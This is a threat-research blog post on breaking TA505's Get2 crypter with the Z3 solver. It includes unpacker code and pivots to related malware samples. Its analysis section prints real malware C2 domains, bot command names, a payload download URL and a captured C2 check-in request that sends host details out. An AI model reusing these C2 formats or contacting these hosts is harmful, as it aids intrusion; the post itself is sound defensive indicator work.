<div class="section-wrap block-1">
	<section class="archive-single-post labs" style="">
		<div class="container">
			<div class="inner">
				<div class="primary-wrap">
					<div class="content-wrap">
						<div id="primary" class="content-area">
							<div class="primary-inner">
								<article id="post-49504" class="post-49504 labs type-labs status-publish has-post-thumbnail hentry tag-apt tag-crypter tag-reverse-engineeering labs_category-advanced-persistent-threat">
									<div class="context wow fadeInRight">
										<div class="flourish"></div>
										<div class="heading">
											<div class="info">
												<a href="https://www.sentinelone.com/labs/category/advanced-persistent-threat/">Advanced Persistent Threat</a>											</div>
											<h1 class="entry-title">Breaking TA505&#8217;s Crypter with an SMT Solver</h1>										</div>
										<div class="meta">
											<span class="author">
												<span><a href="https://www.sentinelone.com/blog/author/jasonr/">Jason Reaves</a></span>											</span>
											/
											<span class="date">
												<a href="https://www.sentinelone.com/blog/2020/03/" rel="nofollow">
													<time datetime="2020-03-04">March 4, 2020</time>
												</a>
											</span>
										</div>
									</div>
									<div class="entry-content">
										<p><strong><em>Using a satisfiability modulo theories (SMT)[8] solver to break the latest variant of the crypter being used on Get2.</em></strong></p>
<h2>Executive Summary</h2>
<ul>
<li><span style="font-weight: 400;">TA505 has been leveraging the Get2 loader using the same crypter since at least September 2019.</span></li>
<li><span style="font-weight: 400;">Crypter overlap found leveraged by actors involved in Clop/CryptoMix ransomware.</span></li>
<li><span style="font-weight: 400;">Crypter overlap found leveraged by actors involved with MINEBRIDGE reported by FireEye to also be used by TA505.</span></li>
<li><span style="font-weight: 400;">Crypter overlap work shows more links of TA505 leveraging Clop/CryptoMix and MINEBRIDGE.</span></li>
</ul>
<h2>Background</h2>
<p><span style="font-weight: 400;">TA505 [3] has been pushing their Get2 loader DLLs for a long time now using the same tactic [4], during this time the crypter has remained the same with a few modifications every few months. This crypter is actually a prime candidate for using SMT [1] to solve it and the latest iteration of the crypter gave me enough of a reason to write up a new unpacker utilizing SMT.</span></p>
<h2>Research Insight</h2>
<p><span style="font-weight: 400;">The crypter on the DLL has remained mostly static for the past 6 months with a few tweaks here and there. For example, the XOR key for decoding the unpacked binary has moved around a bit; the latest version looking at the 32-bit binary had the key referenced as an offset instead of having it placed in relation to the binary blob to be decoded.</span></p>
<figure id="attachment_26029" aria-describedby="caption-attachment-26029" style="width: 634px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="wp-image-26029 size-full" src="https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-1-Data-and-Key-locations-in-recent-sample.jpg" alt="" width="634" height="284" srcset="https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-1-Data-and-Key-locations-in-recent-sample.jpg 634w, https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-1-Data-and-Key-locations-in-recent-sample-300x134.jpg 300w, https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-1-Data-and-Key-locations-in-recent-sample-96x43.jpg 96w" sizes="auto, (max-width: 634px) 100vw, 634px" /><figcaption id="caption-attachment-26029" class="wp-caption-text">Figure 1 Data and Key locations in recent sample</figcaption></figure>
<p><span style="font-weight: 400;">The decoding is actually done by an encoded blob of bytecode which is decoded in a similar manner to the crypted binary.</span></p>
<figure id="attachment_26030" aria-describedby="caption-attachment-26030" style="width: 449px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="wp-image-26030 size-full" src="https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-2-Decoding-routine.jpg" alt="" width="449" height="239" srcset="https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-2-Decoding-routine.jpg 449w, https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-2-Decoding-routine-300x160.jpg 300w, https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-2-Decoding-routine-96x51.jpg 96w" sizes="auto, (max-width: 449px) 100vw, 449px" /><figcaption id="caption-attachment-26030" class="wp-caption-text">Figure 2 Decoding routine</figcaption></figure>
<p><span style="font-weight: 400;">The next layer that is decoded has remained pretty static over the months, it will reconstruct the binary data, run the same decoding routine and finally APLib decompress the resulting blob giving us our unpacked Get2 loader.</span></p>
<figure id="attachment_26031" aria-describedby="caption-attachment-26031" style="width: 1035px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="wp-image-26031 size-full" src="https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-3-Shellcode-decoding-logic.jpg" alt="" width="1035" height="547" srcset="https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-3-Shellcode-decoding-logic.jpg 1035w, https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-3-Shellcode-decoding-logic-300x159.jpg 300w, https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-3-Shellcode-decoding-logic-1024x541.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-3-Shellcode-decoding-logic-768x406.jpg 768w, https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-3-Shellcode-decoding-logic-96x51.jpg 96w" sizes="auto, (max-width: 1035px) 100vw, 1035px" /><figcaption id="caption-attachment-26031" class="wp-caption-text">Figure 3 Shellcode decoding logic</figcaption></figure>
<p><span style="font-weight: 400;">The decoding is going to be:</span></p>
<pre>f(x) = rol(x^Î”, 4) + 2004318072</pre>
<p><span style="font-weight: 400;">We also know the output for the first iteration being a compressed binary will be &#8216;M8Zx90&#8217; so we can construct our problem in Z3[2] and let it solve what the XOR key should be.</span></p>
<pre>def solve_ta505crypter(input, output):     xorkey = BitVec('xor1', 32)     s = Solver()     s.add(rol(BitVecVal(struct.unpack_from('&lt;I',input)[0], 32) ^ xorkey, 4) + 2004318072 == BitVecVal(struct.unpack_from('&lt;I',output)[0], 32))     return(s)</pre>
<p><span style="font-weight: 400;">After solving for the XOR key we just decode the data and write out the decompressed file.</span></p>
<pre>    key = None    for poss_decode in possible_decodes:        s = solve_ta505crypter(t, poss_decode)        if s.check() == sat:            m = s.model()            for d in m.decls():                if d.name() == 'xor1':                    key = m[d].as_long()    if key:        out = ""        for i in range(len(t)/4):            temp = struct.unpack_from('&lt;I', t[i*4:])[0]            temp ^= key            temp = rol(temp, 4)            temp += 2004318072            out += struct.pack('&lt;I', temp &amp; 0xffffffff)                open(sys.argv[1]+'_decodedObject', 'wb').write(out)        if out[:3] == 'M8Z':            print("Decompressing")            out2 = aplib.decompress(out).do()            open(sys.argv[1]+'_decompressed', 'wb').write(out2[0])</pre>
<p><span style="font-weight: 400;">Now with a decoder, we can run it on the past few campaigns to harvest the IOCs. For example:</span></p>
<pre>&lt;..snip..&gt;f3196cb8288afe0c9e64778d9d82e4ad482153b916547809861f6d95677646faDecompressingf66e03c26afac344b4e38345b26ce104f7131ed81e4f4961d43bd35df83493a5Decompressingf769549f2220a54ba738f0ff29c8d6917b9320fb6bc1445a821a990979f49c58Decompressingf775f6b32c8d54e44733d5dda34db81bd62e85f4e1df48500b6160403e482756Decompressing&lt;..snip..&gt;</pre>
<h2>Pivot</h2>
<p><span style="font-weight: 400;">After breaking apart a crypter that appears to only be used by a specific actor group we can pivot on that crypter to see what else they might be using, such as this FlawedAmmy Loader that was mentioned on Twitter[5].</span></p>
<p><code>4064ff7e06367b2431d371ddd1e97f659ec7f3c050229350725c91d6fffff835</code></p>
<p><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-26033" src="https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-8-Signers.jpg" alt="" width="652" height="155" srcset="https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-8-Signers.jpg 652w, https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-8-Signers-300x71.jpg 300w, https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-8-Signers-96x23.jpg 96w" sizes="auto, (max-width: 652px) 100vw, 652px" /></p>
<p><span style="font-weight: 400;">And another FlawedAmmy loader sample: </span><br /><code>ad320839e01df160c5feb0e89131521719a65ab11c952f33e03d802ecee3f51f</code></p>
<p><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-26034" src="https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-9-rundl32.jpg" alt="" width="202" height="83" srcset="https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-9-rundl32.jpg 202w, https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-9-rundl32-96x39.jpg 96w" sizes="auto, (max-width: 202px) 100vw, 202px" /></p>
<p><span style="font-weight: 400;">Also an &#8216;av_block&#8217; sample:</span>  <code>1c983566c27a154f319bf6f1681b1de91930f3b7c019560a0fbc52ead861bf90</code></p>
<p><span style="font-weight: 400;">This sample when unpacked shows to be designed to block protection services, after deobfuscating the strings which are obfuscated using a partial base64 and then eexec decoding.</span></p>
<p><span style="font-weight: 400;">Deobfuscated strings involve a huge list of security products. This sample appears possibly related to Clop or Cryptomix ransomware[6]. Some of the other strings in the binary we can also decode to get the process and files names related to some common server processes such as SQL, ElasticSearch and Apache.</span></p>
<p><span style="font-weight: 400;">Another interesting sample found by pivoting on this packer is a custom loader designed to load TeamViewer which FireEye calls MINEBRIDGE[7] and list that is also used as a backdoor.</span></p>
<p><code>244a272d25328c05361c106d74a126b57a779585b6c7f622f79019bb6838e982</code></p>
<p><span style="font-weight: 400;">This sample after unpacking has a custom UPX layer on it as well.</span></p>
<figure id="attachment_26032" aria-describedby="caption-attachment-26032" style="width: 603px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="wp-image-26032 size-full" src="https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-8-Custom-UPX-layer.jpg" alt="" width="603" height="433" srcset="https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-8-Custom-UPX-layer.jpg 603w, https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-8-Custom-UPX-layer-300x215.jpg 300w, https://www.sentinelone.com/wp-content/uploads/labs/2020/03/Figure-8-Custom-UPX-layer-89x64.jpg 89w" sizes="auto, (max-width: 603px) 100vw, 603px" /><figcaption id="caption-attachment-26032" class="wp-caption-text">Figure 4 Custom UPX layer</figcaption></figure>
<p><span style="font-weight: 400;">After unpacking the sample fully we have a number of interesting strings.</span></p>
<h4>Domains:</h4>
<pre>conversia91.topfatoftheland.topcreatorz123.top123faster.topcompilator333.top</pre>
<h4>Commands</h4>
<pre>drun_commanddrun_URLrundll_commandrundll_URLupdate_commandupdate_URLrestart_commandterminate_commandkill_commandpoweroff_commandreboot_commandsetinterval_commandsetinterval_time</pre>
<h4>C2 Related</h4>
<pre>uuid=%s&amp;id=%s&amp;pass=%s&amp;username=%s&amp;pcname=%s&amp;osver=%s&amp;timeout=%d~f83g7bfiunwjsd1/g4t3_indata.phpuuid=%s&amp;drun_status=1uuid=%s&amp;drun_status=2uuid=%s&amp;rundll_status=1uuid=%s&amp;rundll_status=2uuid=%s&amp;rundll_status=3uuid=%s&amp;update_status=1uuid=%s&amp;update_status=2uuid=%s&amp;restart_status=1uuid=%s&amp;terminate_status=1uuid=%s&amp;kill_status=1uuid=%s&amp;poweroff_status=1uuid=%s&amp;reboot_status=1uuid=%s&amp;setinterval_status=1</pre>
<p><span style="font-weight: 400;">Also some hardcoded strings that seem interesting:</span></p>
<pre>TeamViewer~45feyf923h.binhttps://conversia91.top/~files_tv/~all_files_m.binWindows DefenderCOM1_TeamViewer serverTV_MarkerCInfoWindowTVWidgetWidegetAudioVoipPageTVScrollWinButtonSoftwareTeamViewerTeamViewerDynGateInstanceMutex_GAZGOLDER_VASYA.log.txt.tmp</pre>
<p><span style="font-weight: 400;">The loader performs a checkin to the C2 with a hardcoded User-Agent as well.</span></p>
<pre>POST /~bv0j3irngskdn13/g4t3_indata.php HTTP/1.1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 Mobile/15B150 Safari/604.1Host: compilator333.topContent-Length: 126Cache-Control: no-cacheuuid=9939DCDD-0E9E-754F-30950A0B&amp;id=.1221882482&amp;pass=p6dj76&amp;username=ZWYJukQ&amp;pcname=qIXONnRuFs&amp;osver=Windows 7 SP 1&amp;timeout=60</pre>
<p><span style="font-weight: 400;">Downloading the all_files_m.bin gives us a ZIP compressed file full of TeamViewer software:</span></p>
<pre>Date  	    Time	Attr  Size         Compressed    Name------------------- ----- ------------ ------------  ------------------------2018-09-17 05:17:10 ....A 	27268760 	11389396     TeamViewer.exe2017-01-05 08:10:34 ....A   130       	90           TeamViewer.ini2018-09-17 05:17:10 ....A  	7491824  	2879243      TeamViewer_Desktop.exe2018-09-17 05:17:28 ....A   728816   	150689       TeamViewer_Resource_en.dll2018-09-17 05:17:12 ....A  	1445104  	1210362      TeamViewer_StaticRes.dll------------------- ----- ------------ ------------  ————————————</pre>

								<div class="entry-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
									<figure class="entry-author-avatar">
										<img alt='' src='https://secure.gravatar.com/avatar/dc097aea4e3e46ba1f8f25d74fdb82b49d33ba93f444df1c149bf7b44ff1cb10?s=120&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/dc097aea4e3e46ba1f8f25d74fdb82b49d33ba93f444df1c149bf7b44ff1cb10?s=240&#038;d=mm&#038;r=g 2x' class='avatar avatar-120 photo' height='120' width='120' decoding='async'/>									</figure>
									
									<div class="entry-author-info">
										<h4 class="entry-author-name" itemprop="name">
											<a href="https://www.sentinelone.com/blog/author/jasonr/">
												<span class="author vcard">
													<span class="fn">Jason Reaves</span>
												</span>
											</a>
										</h4>
										<div class="entry-author-description" itemprop="description">Jason Reaves is a Principal Threat Researcher at SentinelLabs who specializes in malware reverse-engineering. He has spent the majority of his career tracking threats in the Crimeware domain, including reverse-engineering data structures and algorithms found in malware in order to create automated frameworks for harvesting configuration and botnet data. Previously, he worked as a software developer and unix administrator in the financial industry and also spent six years in the U.S. Army. Jason holds multiple certifications related to reverse-engineering and application exploitation and has published numerous papers on topics such as writing malware scripts pretending to be a bot, unpackers, configuration data harvesters and covert channel utilities. He enjoys long walks in IDA and staring at RFCs for hours.</div>
										<div class="author-meta">
																																																																	</div>

					<section id="text-2" class="widget widget_text"><h2 class="widget-title">SentinelLabs</h2>			<div class="textwidget"><p>In the era of interconnectivity, when markets, geographies, and jurisdictions merge in the melting pot of the digital domain, the perils of the threat ecosystem become unparalleled. Crimeware families achieve an unparalleled level of technical sophistication, APT groups are competing in fully-fledged cyber warfare, while once decentralized and scattered threat actors are forming adamant alliances of operating as elite corporate espionage teams.</p>
